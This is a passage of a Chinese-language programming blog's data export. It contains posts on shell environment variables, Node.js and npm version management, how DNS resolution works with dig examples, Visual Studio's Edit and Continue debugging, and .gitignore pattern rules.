can print it to double check)$ aaa='ccc'$ aaa=\"ddd\"# 转义双引号$ bbb=\"I am \\\"Wei\\\"\"$ echo $bbbI am \"Wei\"# 拼接$ your_name=\"Wei\"$ str=\"Hello, I know you are \"$your_name\" !\"$ echo $strHello, I know you are \"Wei\"!$ str1=\"hello, $&#123;your_name&#125; !\"$ echo $str1# Print a specific Environment Variable$ echo $str 单引号字符串的限制： 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的； 单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。 Another way to clear local environment variable is by using unset command. To unset any local environment variable temporarily, 1$ unset &lt;var-name&gt; 查看局部环境变量By default, &quot;env&quot; command lists all the current environment variables. But, if used with &#39;-i&#39; switch, it temporarily clears out all the environment variables and lets user execute a command in current session in absence of all the environment variables. 1$ env –i [Var=Value]… command args… Here, var=value corresponds to any local environment variable that you want to use with this command only. 1$ env –i bash Will give bash shell which temporarily would not have any of the environment variable. But, as you exit from the shell, all the variables would be restored. 当然，你也可以使用 1$ export 来查看当前所有的局部环境变量。 用户环境变量（User Environment Variable）和系统环境变量（System wide Environment Variables）用户环境变量（User Environment Variable）.bashrcThis file is user specific file that gets loaded each time user creates a new local session i.e. in simple words, opens a new terminal. All environment variables created in this file would take effect every time a new local session is started. .bash_profileThis file is user specific remote login file. Environment variables listed in this file are invoked every time the user is logged in remotely i.e. using ssh session. If this file is not present, system looks for either .bash_login or .profile files. 系统环境变量（System wide Environment Variables）/etc/environmentThis file is system wide file for creating, editing or removing any environment variables. Environment variables created in this file are accessible all throughout the system, by each and every user, both locally and remotely. /etc/bash.bashrcSystem wide bashrc file. This file is loaded once for every user, each time that user opens a local terminal session. Environment variables created in this file are accessible for all users but only through local terminal session. When any user on that machine is accessed remotely via a remote login session, these variables would not be visible. /etc/profileSystem wide profile file. All the variables created in this file are accessible by every user on the system, but only if that user’s session is invoked remotely, i.e. via remote login. Any variable in this file will not be accessible for local login session i.e. when user opens a new terminal on his local system. Note: Environment variables created using system-wide or user-wide configuration files can be removed by removing them from these files only. Just that after each change in these files, either log out and log in again or just type following command on the terminal for changes to take effect: 1$ source &lt;file-name&gt; 3 常用的环境变量Path比如说你要执行java命令，操作系统会在当前目录和所有在Path中设置的路径位置寻找这个命令对应的java.exe文件。 如果在任意位置找到了java.exe，就运行命令，且不再在其他路径下寻找了。但是如果在当前目录和所有在Path中设置的路径位置下均没有找到，则会提示&#39;java&#39; is not recognized as an internal or external command, operable program or batch file.，如下图： 因此，我们需要将jdk目录下的bin目录添加到环境变量的Path中，bin目录包含了经常用到的可执行文件，比如java、javac、javadoc。 设置好后，我们就可以在任何目录下使用java或者javac了。 ClassPathClassPath 是一个针对Java的，用来告诉Java编译器在哪里存在编译过程中所需的文件（.class）或者包（.jar）路径的变量。 比如在引入一个类import javax.swing.JTable时， 是告诉编译器要引入javax.swing这个包下的JTable类，而 CLASSPATH 就是告诉编译器该到哪里去找到JTable这个类。 如果你想要编译器在当前目录下找，就在CLASSPATH中加上“.”。 如果你想要编译器去C:\\Program Files\\Java\\jdk\\下找javax.swing.JTable这个类，就在CLASSPATH中加入C:\\Program Files\\Java\\jdk\\。 注意： 如果出现【java.lang.NoClassDefFoundError】错误，就有可能是ClassPath未设置或设置错误的问题。 因此，需要将 ClassPath 设置为.;%JAVA_HOME%/lib/;%JAVA_HOME%/jre/lib/，其中JAVA_HOME设置为对应 JDK的路径（我的为：C:\\Program Files\\Java\\jdk1.8.0_60）。 3.参考 https://msdn.microsoft.com/en-us/library/windows/desktop/ms682653(v=vs.85).aspx https://www.tecmint.com/set-unset-environment-variables-in-linux/","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Node.js】 Node.js 与 NPM 的模块版本管理","date":"2017-04-09T12:37:52.000Z","path":"2017/04/09/【Node.js】Node.js 与 NPM 的模块版本管理/","text":"在 【Node.js】 Node.js与NPM入门 中，我们介绍了Node.js与NPM的相关基础知识。 Node.js 与 NPM自身的版本管理首先，可先查看当前 Node.js 与 npm的版本： 12345$node -v//v7.2.1$npm -v//v4.3.0 Node.js的升级Brew在 Mac 平台下，可直接用 brew 升级。 12// 更新node$sudo brew upgrade node Nvm若有需要在不同node或npm之间切换的需求，还可以使用nvm。在Windows平台下，对应nvmw或`nvm-windows。 123456789101112# 列出当前可用的node版本$nvm list# 安装特定node版本$nvm install stable #安装最新稳定版 node$nvm install 8.11.2 #安装 8.11.2 版本# 切换至特定版本$nvm use 8.11.2 #切换至 8.11.2 版本# 设置node默认版本为$nvm alias default 8.11.2 n在 node 中一个叫 n 的模块，可用来管理 node.js 的版本，但是似乎在 Windows 平台64位系统中用不了。 1234# 安装n$npm install -g n# 升级node.js到最新稳定版$n stable npm 的升级1$npm -g install npm 项目中的依赖包版本管理对于升级与管理项目中的依赖包模块版本，推荐使用npm-check，它提供命令行下的图形界面，可以手动选择升级哪些模块。并且，npm-check会自动将选择更新的依赖包更新到package.json中对应的版本描述中。 安装1$ npm install -g npm-check 使用1$ npm-check -u 比如在这个项目中，我选择升级hexo后，npm-check会帮自动下载3.3.1版本，并更新到package.json中对应的版本描述中。 参考 npm-update npm-check","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"},{"name":"npm","slug":"Nodejs/npm","permalink":"http://swsmile.info/categories/Nodejs/npm/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"},{"name":"npm","slug":"npm","permalink":"http://swsmile.info/tags/npm/"}]},{"title":"【Network】DNS原理分析","date":"2017-04-04T05:30:42.000Z","path":"2017/04/04/【Network】DNS原理分析/","text":"记得有一次面试，被问道：当在浏览器中输入一个URL后会发生什么。就个人而言，很喜欢这样发散性的问题，因为客观的来说，这类问题能够客观地考察其对HTTP、Web的理解，也不用担心其有意准备了面试答案，稍微深入某个细节，就可了解其掌握程度。而且，从不同的角度看完全可以得出不同的分析过程。 在这其中一个重要的过程就是DNS解析（DNS：Domain Name System）。 一 产生背景TCP/IP网络中要求每一台互连的主机都需要拥有一个唯一不重复的IP地址，不同的主机通过这个唯一的IP地址进行通信。然而，直接使用这个IP非常不方便。因为，IP是一串数据序列，并不好记忆。 其实，电话号码与IP非常类似，每一台电话都拥有一个唯一的电话号码（每一台主机都有一个唯一不重复的IP地址）。电话号码由数字组成比较难记（当然IP也是），而且在某个人搬家后，他的电话号码就不得不变化（IP自然也存在需要变化的情况），非常难管理。 因此，在TCP/IP世界诞生之初，就有一个叫主机识别码的东西。每一台联网的主机都赋予一个主机识别码，以标识这台主机，并替代直接使用一大串非常难记的IP地址。为此，系统必须能够自动地将输入的主机标识码转换为对应的IP地址。 为了实现这个功能，每台主机都将这个主机标识符到IP地址的转换表存储在一个叫hosts的数据库文件中。几乎所有的现代操作系统中，还仍然存在这个hosts文件，只是其中的内容变少了（因为其大部分职能都被DNS服务器替代了）。 我的hosts文件的一个例子： hosts文件路径： Windows：C:\\Windows\\System32\\drivers\\etc\\hosts Linux：/etc/hosts 在互联网的起源ARPANET中，起初由互联网信息中心（SRI-NIC）整体管理一份hosts文件。如果新增一台主机接人到ARPANET网 或者 已有的某台主机要进行IP地址变更，中心的这个hosts文件就得更新，而且，其他主机则不得不定期下载最新的hosts文件以正常使用网络。 然而，随着网络规模的不断扩大、接人主机的个数不断增加，使得这种集中式管理主机名和IP地址映射关系的方案可行性逐渐降低。 其实这种从集中式管理到分布式管理方式的转变需求，和当今架构演变需求不是非常类似吗？分布式处理、主从分离、负载均衡…… 在上述背景之下，产生了一个可以有效管理主机名和IP地址之间对应关系的系统，那就是DNS系统。在这个系统中，主机的管理机构可以对该对应关系进行变更和设定。 二 域名和域名服务器1 域名在介绍DNS系统的工作原理之前，我们先要了解什么是域名。 域名是一个为了识别主机名称和组织机构的一种具有分层结构的名称。 域名由英文字母、数字和某些允许的英文字符用点号（“.”）连接组成，形成层次结构，这样一个主域名分配给一个组织，这个组织可以拥有多个不同名的主机，并自由地为这些主机分配主域名下的不同子域名。 域名的分层结构： 域名的分层结构如一棵树，顶点是树的根（root），顶点的下一层称为顶级域名（TLD: Top Level Domain），顶级域名可分为国别顶级域名（ccTLD: country code Top Level Domain）和通用顶级域名（gTLD: generic Top Level Doamin）两种类型。 国别顶级域名：包括“cn（中国）”、“jp（日本）”、“uk（英国）”等表示国家的域名 通用顶级域名：包括“edu（教育机构）”、“com（商业组织）”、“org（管理组织）”等特定领域的域名 事实上，在实际的使用中，这里的“特定领域”已经不再那么严格了，比如个人网站也能使用“.com”或“.org”结尾的特定领域顶级域名 2 域名服务器如上面的分层结构中描述，每一个层级中的每一个节点都有一个域名服务器来管理与其相关的下一层的所有子域名，而且这些域名服务器都称为权威服务器。 （1）各层中的节点都有各自的域名服务器比如，.cn拥有自己域名服务器，.uk拥有自己的域名服务器.，people.cn拥有自己的域名服务器，.baidu.com拥有自己的域名服务器…. （2）各层域名服务器都了解自己所在节点的下一连接分层所有节点的域名服务器的IP地址比如，.cn了解.people.cn域名服务器的IP 和 .china.cn域名服务器的IP…… （3）顺着根节点可访问到世界上所有域名服务器的地址由于每一层都记录下一层节点的域名服务器，所以可以从根节点开始，顺着层次结构，最终访问到世界上所有的域名服务器地址。 3 根域名服务器Root节点所对应DNS服务器叫做根域名服务器。它对整理DNS解析起着至关重要的作用。根域名服务器中记录着下一层所有域名服务器的IP地址（.cn、.uk、.com、.org…）。如果需要增加一个类似jp或者org的域名，或者修改已有域名的名称，在需要再根域名服务器中追加或者变更。 全球13组根域名服务器以英文字母A到M依序命名，域名名称格式为“[字母].root-servers.org”。其中有11个是以*任播 *（Anycasting）技术在全球多个地点设立镜像站。 任播：在待通信网络地址和网络节点之间存在一对多的关系：每一个网络地址对应一群接收节点，但在任何给定时间，只有其中一台网络节点会响应并发回响应数据。 在 http://www.internic.net/zones/named.root ，你可以查询到互联网根域名服务器的信息。 4 各层级域名服务器（1）容灾能力类似地，在根域名服务器的下一层级的域名服务器中，记录着再一下层级的域名服务器的IP地址。 如果域名服务器无法访问，那么对应域的DNS查询也就无法正常工作了。因此，为了提高容灾能力，对于某个域名，一般会设置至少两个的域名服务器（它们都是这个域的权威服务器）。 （2）子域的划分swsmile.info就是一个顶级域名，而www.swsmile.info却不是顶级域名，他是在swsmile.info这个域里的一叫做www的主机，因此我们当然也给我们的主站命名为aaa.swsmile.info或cccsss.swsmile.info，意义上与www是完全等同的，没有任何区别，只是人们习惯上把主站命名为www罢了。 一级域之后还有二级域，三级域，只要我拥有一个顶级域，那么我可以随意在前面多加几个域（当然需要在长度限制内），比如aaa.bbb.ccc.swsmile.info、a.b.c.www.swsmile.info等等都是可以的。 三 DNS解析过程1 本机设置的DNS现在我有一台计算机，通过 ISP（Internet Service Provider，比如中国电信） 接入了互联网，那么 ISP 就会给我提供一个可供服务的DNS服务器的IP地址。 这里需要说明一下，ISP提供的可供服务的DNS服务器IP地址，指的是我可以使用它完成DNS解析服务，但并不意味着我只能使用它，因为我还可以使用114.114.114.114（114DNS）、8.8.8.8（Google Public DNS）、208.67.220.220（OpenDNS ）等公共的DNS服务器。更极端一点，我还可以自己搭一个DNS服务器。 注意，这个DNS服务器不是权威服务器，而是相当于一个代理的 DNS 解析服务器。也就是说，当我向它发出一个DNS解析请求时，它会检查自己的缓冲中是否已经存在了我需要查询的host对应的IP的地址。如果不存在，它会帮我向权威服务器迭代查询，并将查询结果返回给我。至于它有没有向权威服务器迭代，对我来说是透明的（不知情的），因此称它是一个代理的 DNS 解析服务器。 比如，我的DNS设置： 2 DNS解析过程在以下的描述过程中，本机设置的DNS服务器简称为本机DNS服务器，但需要明确这台服务器并不是在本机，而且其实你可以任意指定。 以在浏览器中输入“http://en.wikipedia.org” 查询后的DNS解析过程为例： 浏览器检查浏览器内部的DNS缓存中该DNS条目是否有效（存在该缓存，且未过期）。如果有效，则直接返回IP地址； 如果无效，查询操作系统的DNS缓存中是否存在该DNS条目。如果存在，则直接返回IP地址； 如果不存在，浏览器向本机DNS服务器发出DNS请求（询问：“你知道en.wikipedia.org的IP吗？”）。 本地DNS服务器查询自己的缓冲中该查询的DNS条目是否有效（存在该条目于缓存，且未过期）？如果有效，则直接返回IP地址； 如果无效，本地DNS服务器向根服务器请求“.org”域的DNS服务器IP； 本地DNS服务器向“.org”域DNS服务器请求“wikipedia.org”域的DNS服务器IP 本地DNS服务器向“wikipedia.org”域DNS服务器请求“en.wikipedia.org”域的DNS服务器IP 最终，本地DNS服务器获取到“en.wikipedia.org”域的服务器IP，并返回给本机 当然通过dig +trace en.wikipedia.org（在下文中会介绍dig工具常用的使用），你也能清晰地看到这个完整的过程： 再次强调：向根服务器请求“.org”域的DNS服务器IP、向“.org”域DNS服务器请求“wikipedia.org”域的DNS服务器IP和 向“wikipedia.org”域DNS服务器请求“en.wikipedia.org”域的DNS服务器IP 的这三个过程都是在本地DNS服务器上完成，对于本机来说是透明的。 3 DNS的查询类型（1）递归查询主机向本地DNS服务器的查询一般都是采用递归查询。 所谓递归查询就是：如果主机所询问的本地DNS服务器不知道被查询的域名的IP地址，那么本地DNS服务器就从根域名服务器开始发出查询请求，直至查询到目标IP地址，或者报错（表示无法查询到所需的IP地址）。 具体来说，本地DNS服务器会向根域名服务器发出查询请求报文。如果根域名服务器没有直接给出结果，而是给出下一级域名服务器的（一台权威服务器）IP，那么本地DNS服务器就会向这个下一级域名服务器发出请求……一级一级地向下查询，直到查询到目标IP地址，或者报错。但是，本地DNS服务器一级一级地向权威服务器查询的行为对于发起查询的主机来说是透明的。 （2）迭代查询本地DNS服务器向根域名服务器的查询一般都是采用迭代查询。 迭代查询的特点：当根域名服务器收到本地DNS服务器发出的查询请求报文时，要么给出所要查询的IP地址，要么告诉本地DNS服务器：“你下一步应当向哪一个域名服务器（暂且称为A权威域名服务器）进行查询，并给出该A权威域名服务器的IP”。 如果本地DNS服务器接收到的是A权威域名服务器的IP，就向它发出查询请求。类似地，A权威域名服务器在收到本地DNS服务器的查询请求后，要么给出所要查询的IP地址，要么告诉本地服务器下一步应当向哪一个下级的权限域名服务器进行查询……最终，本地DNS服务器要么查询到目标IP地址，要么报错。 四 域名解析设置在一个域名的解析设置中，存在一些参数可供设置。 以下是一个域名的解析设置（仅供参考）： 1 常见的域名记录类型（1）主机记录（A记录）用于名称解析的重要记录，它将特定的主机名映射到对应主机的IPv4地址上，是最常用的的记录类型。 比如，这里把en主机（对应en.wikipedia.org域名）映射到198.35.26.96这个IP。因此，我们输入en.wikipedia.org本质上是访问了198.35.26.96： （2）IPv6主机记录（AAAA记录）与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 （3）域名服务器记录（NS记录）用于指定此域名由哪个权威DNS服务器来进行解析。 一般来说，为了服务的安全可靠，至少应该有两条NS记录（指定多个DNS服务器为此域名服务），而A记录（指定多个IP为此域名服务）也可以有多条，这样就提供了服务的冗余性，防止出现单点失败。 （4）别名记录（CNAME记录）用于将某个主机映射到某个域名上，访问这台主机与访问被指向域名的效果相同。 比如，对于顶级域名swsmile.info，一条记录的类型为CNAME记录，主机记录是mail，记录值是gmail.google.com。这意味着，当用户访问mail.swsmile.info时，实际上是访问了gmail.google.com（虽然浏览器的地址栏里仍然写着mail.swsmile.info）。 再比如，CNAME记录还可以用于域名的跳转（这样的配置对用户来说，是感知不到）。还是举例来说，我为swsmile.github.io设置一条CNAME记录，值为www.swsmile.info。 因为我希望，用户无论通过www.swsmile.info还是swsmile.github.io都可以访问到我的111.111.111.111主机。 1234&gt;$ dig swsmile.github.io&gt; swsmile.github.io 1000 IN CNAME www.swsmile.info&gt; www.swsmile.info 600 IN A 111.111.111.111 上面结果显示，swsmile.github.io的CNAME记录指向www.swsmile.info。也就是说，用户查询swsmile.github.io的IP时，实际上返回的是www.swsmile.info的IP地址（即111.111.111.111）。 这样的好处是，当我需要变更服务器IP地址时，只要修改www.swsmile.info的A记录即可。 （5）逆向查询记录（Pointer Records，PTR记录）用于从IP地址反查域名。dig命令的-x参数用于查询PTR记录。 （6）邮件记录（Mail eXchange，MX记录）指定接收电子邮件的服务器地址。 2 TTLTTL(Time-To-Live)，表示一条域名解析记录在DNS服务器上的有效缓存时间。 当某台的DNS服务器接收到主机发来的解析请求时，就会迭代向权威DNS服务器发出解析请求从而获得解析记录；在获得这条域名解析记录后，会在这台DNS服务器中保存一段时间。在这段时间内，如果再接收到这条域名解析记录对应查询请求，DNS服务器将不再向权威DNS服务器迭代发出请求，而是直接返回缓存中的记录。而这条域名解析记录的TTL值，指定了在这条记录在这台DNS服务器上保留的时间。 (1)设置较大的TTL值，加速域名解析对于很少变化域名记录的网站，可以增大域名记录的TTL值，以增加这条域名记录在各个DNS服务器中的缓存时间。这样当主机访问这个网站时，请求的DNS服务器就不必再去请求权威服务器，而是直接将缓存中这条域名记录直接返回给主机。 （2）设置较小的TTL值，加速变化后的域名解析相反，如果设置了较小的TTL值，当域名解析记录变化时，就可以在更短的时间生效。当然，这也意味着，会增加DNS服务器向权威服务器查询这条解析记录的次数，因而会增加主机平均查询这条域名解析记录的时间，影响用户的访问体验。 总的来说，TTL大了，修改解析记录后等待生效的时间就会变长。TTL小了，域名的解析速度就会受到影响。因此，TTL设置多少合适，没有一个绝对的答案，而需要根据网站的具体情况决定。 五 dig工具（1）+trace -&gt; 显示在DNS服务器迭代向权威服务器查询的过程12345678910111213141516171819202122232425262728293031323334&gt; $ dig +trace en.wikipedia.org; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; +trace en.wikipedia.org;; global options: +cmd. 5 IN NS a.root-servers.net.. 5 IN NS c.root-servers.net.. 5 IN NS b.root-servers.net.. 5 IN NS l.root-servers.net.. 5 IN NS d.root-servers.net.. 5 IN NS j.root-servers.net.. 5 IN NS m.root-servers.net.. 5 IN NS f.root-servers.net.. 5 IN NS i.root-servers.net.. 5 IN NS h.root-servers.net.. 5 IN NS g.root-servers.net.. 5 IN NS k.root-servers.net.. 5 IN NS e.root-servers.net.;; Received 228 bytes from 192.168.30.2#53(192.168.30.2) in 220 msorg. 172800 IN NS a0.org.afilias-nst.info.org. 172800 IN NS a2.org.afilias-nst.info.org. 172800 IN NS b0.org.afilias-nst.org.org. 172800 IN NS b2.org.afilias-nst.org.org. 172800 IN NS c0.org.afilias-nst.info.org. 172800 IN NS d0.org.afilias-nst.org.;; Received 436 bytes from 198.97.190.53#53(198.97.190.53) in 327 mswikipedia.org. 86400 IN NS ns0.wikimedia.org.wikipedia.org. 86400 IN NS ns2.wikimedia.org.wikipedia.org. 86400 IN NS ns1.wikimedia.org.;; Received 146 bytes from 199.19.53.1#53(199.19.53.1) in 130 msen.wikipedia.org. 600 IN A 198.35.26.96;; Received 78 bytes from 91.198.174.239#53(91.198.174.239) in 262 ms （2）+short -&gt; 最少内容显示如果不想看到这么多内容，可以使用+short参数。 123&gt; $ dig +short en.wikipedia.org198.35.26.96 （3）@ -&gt; 指定某台DNS服务器进行解析在未指定DNS服务器时，dig会向本级指定的默认DNS服务器查询。 12345678910111213141516171819&gt; $ dig @114.114.114.114 en.wikipedia.org; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @114.114.114.114 en.wikipedia.org; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24390;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;en.wikipedia.org. IN A;; ANSWER SECTION:en.wikipedia.org. 66 IN A 198.35.26.96;; Query time: 9 msec;; SERVER: 114.114.114.114#53(114.114.114.114);; WHEN: Thu Apr 6 07:31:39 2017;; MSG SIZE rcvd: 50 六 WHOIS通过WHOIS，你可以查询到这个域名的所有者信息。 对于大多数根域名服务器，基本的WHOIS由ICANN维护，而WHOIS的细节则由控制那个域的域注册机构维护。 对于240多个国家代码顶级域名（ccTLDs），通常由该域名权威注册机构负责维护WHOIS。例如中国互联网络信息中心（China Internet Network Information Center）负责.CN域名的WHOIS维护，香港互联网注册管理有限公司（Hong Kong Internet Registration Corporation Limited）负责.HK域名的WHOIS维护，台湾网络信息中心（Taiwan Network Information Center）负责.TW域名的WHOIS维护。 比如，我可以查看baidu.com的所有者信息： 七 参考 《图解HTTP》 Wikipedia -Domain Name System Wikipedia - Anycast Wikipedia - 域名 Wikipedia - Time to live","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【C#】Visual Studio 2017 一边Debug，一边修改代码","date":"2017-04-03T11:44:33.000Z","path":"2017/04/03/【C-】Visual-Studio-2017-一边Debug，一边修改代码/","text":"好久没写C#了，最近在学习著名科学上网工具 shadowsocks-windows 的源代码，想着可以边断点调试，边加上一些注释以方便理解，stackoverflow 和 msdn 随便翻了一下，竟发现了Debug新世界。 原始需求原始需求是这样，本来我只是希望在断点调试项目的时候，可以增加一些注释，以方便理解。 但是遇到一个问题：在处于断点模式（Break Mode，即程序当前命中了断点，并在断点处阻塞着不能向下执行）时，是可以随意增加注释的： 当不处于命中断点的状态时（Debug Mode， 程序正在跑呀跑呀跑~），如果我尝试增加注释，就会有这样的提示Changes are not allowed while code is running。 有小伙伴说可以用Bookmark，试了一下也不知道是怎么玩的。 之前在XCode中写Objective-C Debug时，注释都是可以随便加的，无论是否处于 Debug Mode 下或处于Break Mode（当前命中了断点）！ 惊喜的发现随便逛逛 stackoverflow 和 Microsoft blog，惊喜的发现，原来早在Visual Studio 2013，就可以在断点模式（Break Mode）下增加注释，而且，还可以修改代码，编译器和根据你修改的代码实时改变代码运行过程中的流程（see here）。 举个例子就可以清晰地明白： 以下是一个基于MVC5的Web Application，此时根据变量a的值决定是否进入if内部，显而易见，这时候肯定是会进入if内部的： 现在，我将if(a) 修改为 if(b)（这时候编译器会根据代码的修改，立刻编译），并且step into往下走，竟然发现，我可以实时的改变代码，且改变代码的执行流（修改后，不满足if的条件，因此不会return Content(&quot;ss&quot;)）。 在之前的使用中，如果我发现这里的判断条件需要修改，且我仍然需要动态调试，我会Stop debugging（Shift + F5），将if(a) 修改为 if(b)，Start Debugging，最终代码断点执行到这个位置。 如何开启Edit and Continue从Visual Studio 2013开始，这一功能是默认开启的。当然我现在用的是Visual Studio 2017啦，爽爽哒。 如果你发现这个功能不能使用，你需要在你的Project和Visual Studio中分别检查是否正确设置了： 检查在Project中是否开启了这一功能：对于Web Application是可以在Project中手动开启和关闭的（在 WinForm 的 Project 中好像我没有找到设置）： 检查在Visual Studio中是否开启了这一功能： [Tools / Options] 搜索Enable Edit and Continue，并勾选 一些不能使用的场景官方指出有些场景下是明确不能使用的（From msdn）： Mixed-mode (native/managed) debugging. SQL debugging. Debugging a Dr. Watson dump. Editing code after an unhandled exception, when the Unwind the call stack on unhandled exceptions option is not selected. Debugging an embedded runtime application. Debugging an application with Attach to rather than running the application with Start from the Debug menu. Debugging optimized code. Debugging managed code when the target is a 64-bit application. If you want to use Edit and Continue, you must set the target to x86. (Project, Properties, **Compile tab, Advanced Compiler setting.). 别人踩的坑，mark 一下：Edit and Continue: “Changes are not allowed when the debugger has been attached to an already running process or the code being debugged was optimized at build or run time” 参考 How to: Enable and Disable Edit and Continue Changes are not allowed when the debugger Supported Code Changes (C#) https://msdn.microsoft.com/en-us/library/7932e88z.aspx","comments":true,"categories":[{"name":"Debug","slug":"Debug","permalink":"http://swsmile.info/categories/Debug/"}],"tags":[{"name":"C#","slug":"C","permalink":"http://swsmile.info/tags/C/"},{"name":"Debug","slug":"Debug","permalink":"http://swsmile.info/tags/Debug/"},{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://swsmile.info/tags/Visual-Studio/"}]},{"title":"【Git】 Git之忽略文件（gitignore）","date":"2017-04-03T05:08:26.000Z","path":"2017/04/03/【Git】Git之忽略文件（gitignore）/","text":"今天分享一下Git中一个非常重要的文件.gitignore，这个文件用来定义哪些文件或文件夹，Git不需要跟踪，从而也不需要将这些文件添加到版本管理中。 一.文件意义在实际项目中，可能存在一些文件或文件夹是不需要做版本跟踪的，也不需要做版本管理，但是又必须将其放到本地的Git的工作目录中，比如，编译过程中生成的一些临时文件（Java字节码文件.class）、数据库密码的配置文件等等。 当然，他们仍然存在于本地 repostitory，但是在执行git push时不会上传到远端 repository ，因此远端 repository 中自然也不会存在这些文件。 对于这些文件或文件夹，每次git status时，都会出现Untracked files ...，感觉非常的蛋疼！ 好在Git在设计之初，就考虑到了这个问题。在一个以Git做为版本管理工具的项目中，可以在.gitignore文件中定义，哪些文件或文件夹不需要被Git跟踪。定义之后，Git就会自动忽略这些文件了。 二.文件模板当然，对于各个技术栈或编程语言，在GitHub中，大神们已经为我们整理好了各种各样的.gitignore，我们只要根据自己的需求稍微修改一下就好了。 地址：github/gitignore随便据几个例子，比如： 在JetBrains.gitignore中，.idea/是JetBrains工具生成的用于管理工程和生成一些临时文件的文件夹 在Node.gitignore中，node_modules/是NPM项目用于存储第三方依赖库的文件夹，每次接手一个新的Node项目，只需要npm install即可 在VisualStudio.gitignore中，coverageor*.coverage是一些项目在执行测试用例时自动生成的测试覆盖率报表（多数的大型项目都会在持续集成系统（Continuous Intergration System）中执行相关测试，并输入测试覆盖率报表，因此即使我们在本地执行测试，也不需要将相关测试覆盖率报表push到Git中） 三.忽略原则 忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，**也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。 四.忽略规则定义（重点）虽然，github/gitignore中已经为各种类型的项目定义了.gitignore模板，但是我们仍然需要了解在.gitignore中对文件或文件夹定义忽略规则的方法： 首先，我们需要明确关于文件和文件夹的命名： 文件即可以命名为”*.*“（即以.为后缀，比如abc.jpg、1.a），也可以命名为”\\“（比如abc、aaa） 文件夹即可以命名为”*“（比如abc、aaa），也可以命名为” *.*“（即存在后缀，比如abc.a、1.b，只是我们一般不这样起名罢了） 之所以强调上述的细节，是因为在网上的有些Blog中，并没有考虑到文件夹可以以.*为后缀的方式命名，故认为abc.a规则只是忽略命名为abc.a的文件，不包括忽略命名为abc.a的文件夹，这是错误的！！！！ 还需要明确： ​ 忽略文件夹意味着这个文件夹中的所有文件和文件夹（当然也包括其中的子文件和子文件夹）都会被忽略，除非添加了额外的非过滤规则 1.定义过滤规则（1）不指定绝对路径忽略所有名为某个指定名称的文件或文件夹，无论它位于根目录（root directory）or 子目录（subdirectory）： 12# ignore all files or folders named &quot;foo.txt&quot; wherever they are locatedfoo.txt 忽略所有以.o 或.a结尾的文件或文件夹，无论它位于根目录（root directory）or 子目录（subdirectory）： 12# ignore all files or folders which name ends up with &quot;.o&quot; or &quot;.a&quot; wherever they are located*.[oa] 忽略所有以.zip结尾的文件或文件夹，无论它位于根目录（root directory）or 子目录（subdirectory）： 12# ignore all files or folders which name ends up with &quot;zip&quot; wherever they are located*.zip 忽略所有以a结尾的文件夹（不忽略以a结尾的文件），无论它位于根目录（root directory）or 子目录（subdirectory）： 12# ignore all folders which name ends up with &quot;a&quot; wherever they are located*a/ （2）指定绝对路径只忽略根目录下名为abc的文件夹或文件，子目录中名为abc文件或文件夹不在忽略范围内： 12# ignore a specified folder or file which name is &quot;abc&quot; and is located in root directory/abc 需要注意的是，忽略根目录下名为abc的文件夹意味着，其中包含的子文件夹中的文件和文件夹都会被忽略，如/abc/a/1.exe、/abc/a/b/2.exe 只忽略根目录下名为abc的文件夹（不忽略根目录下名为abc的文件），子目录中名为abc文件夹不在忽略范围内： 12# ignore a specified folder which name is &quot;abc&quot; and is located in root directory/abc/ 忽略根目录下，abc文件夹中某一个子文件夹下的a.exe： 12# ignore all files which is located in /abc/abc/*/a.exe 如/abc/a/a.exe、/abc/b/a.exe，但不包括/abc/b/c/a.exe、/abc/b/c/d/a.exe。 忽略根目录下，abc文件夹中处于任意位置下的a.exe： 12# ignore all files which is located in /abc/abc/**/a.exe 如/abc/a/a.exe、/abc/b/a.exe、/abc/b/c/a.exe、/abc/b/c/d/a.exe 注：以上两个例子想说明“*” 与 “**”的区别。一句话概括就是：\\*只能匹配一级文件夹，而\\*\\*可以匹配一级或多级文件夹。 忽略根目录下，abc文件夹中的所有文件（包括其子文件夹中的文件或文件夹）： 12# ignore all files which is located in /abc/abc/* 只忽略根目录下/abc/a.java这个文件： 12# # ignore a specified folder which name is &quot;a.java&quot; and is located in /abc/abc/a.java 2.定义非过滤规则与过滤规则完全类似，但是只需要在上述规则前面增加!，即定义为非过滤规则。 比如： 忽略所有以.a结尾的文件或文件夹： 12# ignore all files or folders which name ends up with &quot;.a&quot; wherever they are located*.a 那么，不忽略所有以.a结尾的文件或文件夹： 12# do not ignore all files or folders which name ends up with &quot;.a&quot; wherever they are located!*.a 想象一个场景：我们只需要跟踪根目录下的abc文件夹中的one.java文件，这个文件夹中的其他文件都不需要被跟踪。那么我们可以这样定义： 12/abc/!/abc/one.java 假设我们只有过滤规则没有非过滤规则，那么我们就需要把/abc/文件夹下除了one.java以外的所有文件都列出来！ 3.通配符匹配语法 斜杠/开头表示根目录； 星号*通配多个字符（不包括”/“）； 双星号**通配多个字符（包括”/“）； 问号?通配单个字符； 方括号[]表示匹配其中的某单个字符； 4.检查文件是否被忽略我们可以使用以下命令检查某个文件或文件夹是否被忽略，如果输出了输入的pathname，则表明这个文件或文件夹会被Git忽略。 1git 